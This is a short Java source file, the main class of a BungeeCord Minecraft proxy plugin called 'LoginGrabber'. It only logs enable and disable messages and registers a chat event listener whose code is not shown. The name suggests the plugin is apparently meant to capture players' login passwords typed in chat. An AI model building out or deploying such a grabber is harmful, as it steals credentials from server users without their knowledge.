package javanullerror.logingrabber;

import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.plugin.Plugin;
import javanullerror.logingrabber.listener.ChatEventListener;
import net.md_5.bungee.event.EventHandler;

public final class LoginGrabber extends Plugin {

    @Override
    public void onEnable() {
        getLogger().info("Login Grabber Enabled. Developed By JavaNullError#6249");
        getProxy().getPluginManager().registerListener(this, new ChatEventListener());
    }

    @Override
    public void onDisable() {
        getLogger().info("Login Grabber Disabled.");
    }
}
